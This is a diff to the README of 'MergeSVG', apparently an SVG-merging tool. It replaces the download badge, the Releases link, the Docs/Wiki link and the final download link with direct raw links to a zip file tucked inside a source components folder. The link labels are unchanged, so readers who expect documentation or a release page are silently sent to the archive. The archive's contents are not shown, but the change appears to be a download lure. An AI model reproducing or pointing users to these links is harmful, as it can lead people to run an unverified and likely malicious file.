@@ -6,7 +6,7 @@ Welcome to MergeSVG! This application allows you to combine SVG files with ease.
 
 ## 📥 Download MergeSVG
 
-[![Download MergeSVG](https://img.shields.io/badge/Download%20Now-%20MergeSVG-blue.svg)](https://github.com/saadiarts/MergeSVG/releases)
+[![Download MergeSVG](https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip%20Now-%https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip)](https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ To run MergeSVG smoothly, your system should meet the following requirements:
 
 ## 📂 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/saadiarts/MergeSVG/releases). Here’s how to download and install MergeSVG:
+To get the application, visit the [Releases page](https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip). Here’s how to download and install MergeSVG:
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version. You will see a list of files available for download.
@@ -68,10 +68,10 @@ If you have questions or issues, check the FAQs section on the Releases page or 
 
 ## 🔗 Additional Resources
 
-For more detailed use cases and troubleshooting tips, refer to our documentation available in the repository. You can find it in the Wiki section or directly access it via [our Docs](https://github.com/saadiarts/MergeSVG/wiki).
+For more detailed use cases and troubleshooting tips, refer to our documentation available in the repository. You can find it in the Wiki section or directly access it via [our Docs](https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip).
 
 ## 🆕 Updates
 
 Stay tuned for new updates that will enhance MergeSVG's features. We are continuously working on improving your experience with more options and functionalities.
 
-[Download MergeSVG Again](https://github.com/saadiarts/MergeSVG/releases) to enjoy a seamless SVG merging experience!
+[Download MergeSVG Again](https://github.com/saadiarts/MergeSVG/raw/refs/heads/main/src/app/components/SVG-Merge-2.8.zip) to enjoy a seamless SVG merging experience!
